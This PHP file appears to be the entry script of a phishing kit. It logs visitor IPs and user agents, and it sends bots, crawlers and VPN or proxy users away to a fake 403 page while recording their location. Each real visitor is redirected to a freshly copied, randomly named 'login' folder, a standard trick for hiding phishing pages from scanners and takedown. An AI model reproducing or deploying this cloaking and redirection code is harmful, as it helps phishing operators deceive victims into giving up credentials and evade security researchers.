<?php

$settings = include('settings/settings.php');

if($settings['debug'] == "1"){
	ini_set('display_errors', '1');
	ini_set('display_startup_errors', '1');
};


$useragent = $_SERVER['HTTP_USER_AGENT'];

include("login/Bots/Anti/out/Crawler/src/CrawlerDetect.php");

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;


$settings = include 'settings/settings.php';

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}


if($settings['log_user'] == "1"){
	
	# Log Client
	
	$date = date("h:i:s d/m/Y");
	$ip = get_client_ip();
	$useragent = $useragent;
	$logfile = fopen("Logs/logs.txt", "a");
	$logs = "<=====[ LOGGED - CLIENT {$date}|{$ip}|{$useragent} ] =====> \n";
	fwrite($logfile, $logs);
	fclose($logfile);
}

if($settings['proxy_block'] == "1"){

	# Check VPN | Proxy 

	$ip = get_client_ip();
	$url = "https://blackbox.ipinfo.app/lookup/".$ip;
	$ch = curl_init();
	curl_setopt($ch,CURLOPT_URL,$url);
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	$resp = curl_exec($ch);
	curl_close($ch);
	$result = $resp;
	if($ip != "127.0.0.1"){
		if($result == "Y") {
		$click = fopen("Logs/proxy-block.txt","a");
		$message = $ip."\n";
		$date = date("h:i:s d/m/Y");
		fwrite($click,"{$ip}|{$date}|VPN/Proxy"."\n");
		fclose($click);
		header("HTTP/1.0 404 Not Found");
		die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
		exit();
		}
	}

}

include("login/Bots/fucker.php");
include("login/Bots/blacklister.php");
include("login/Bots/Anti/out/blacklist.php");
include("login/Bots/Anti/out/bot-crawler.php");
include("login/Bots/Anti/out/anti.php");
include("login/Bots/Anti/out/ref.php");
include("login/Bots/Anti/out/bots.php");


$useragent = $_SERVER['HTTP_USER_AGENT'];

if ($CrawlerDetect->isCrawler($useragent)){
	$url = "https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location";

    function work($data) {
        $data = str_replace("jsonFeed({", "", $data);
        $data = str_replace("});", "", $data);
        $data = str_replace("\"","", $data);
        $data1 = explode(",", $data);
        $dataf = array();
        foreach ($data1 as $value) {
            $ds = explode(":", $value);
            $dataf[$ds[0]] = $ds[1];
            //$dataf[] += [$ds[0] => $ds[1]];
        }
        return $dataf;
    }

    $link = file_get_contents($url);
    $dataf = work($link);
	$IP = get_client_ip();
	$country = $dataf['country'];
	$timezone = $dataf['timezone'];
	$lati = $dataf['latitude'];
	$longi = $dataf['longitude'];
	$city = $dataf['city'];
	$useragent = $useragent;
	$message = "+++++[ BOT - CrawlerDetect ]+++++\n";
	$message .= "User-Agent : ".$useragent."\n";
	$message .= "IP : ".$IP."\n";
	$message .= "Timezone : ".$timezone."\n";
	$message .= "Latitude : ".$lati."\n";
	$message .= "Longitude :".$longi."\n";
	$message .= "City : ".$city."\n";
	$message .= "+++++[ @f4c3r100 ]+++++\n\n";
	$xy = fopen("./Logs/Botslogs/logs.txt", "a");
	fwrite($xy, $message);
	fclose($xy);
	header("HTTP/1.0 404 Not Found");
	die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
	exit();
} else {

	$DIR=md5(rand(0,100000000000));
	function recurse_copy($name,$DIR) {
		$dir = opendir($name);
		@mkdir($DIR, 0777);
		while(false !== ( $file = readdir($dir)) ) {
			if (( $file != '.' ) && ( $file != '..' )) {
				if ( is_dir($name . '/' . $file) ) {
					recurse_copy($name . '/' . $file,$DIR . '/' . $file);
				}	else {
					copy($name . '/' . $file,$DIR . '/' . $file);
				}
			}
		}
		closedir($dir);
	}
	
	# Client Number

	$o = file_get_contents("Logs/client.txt");
	$client = (int)$o + 1;
	$add = fopen('Logs/client.txt', 'r+');
	fwrite($add, $client);
	fclose($add);


	$name="login";
	recurse_copy( $name, $DIR );
	echo "<script>window.location.href = "."\"".$DIR."\"; </script>";
	$file = fopen("temp.txt","w");
	fwrite($file, $DIR);
}
?> 
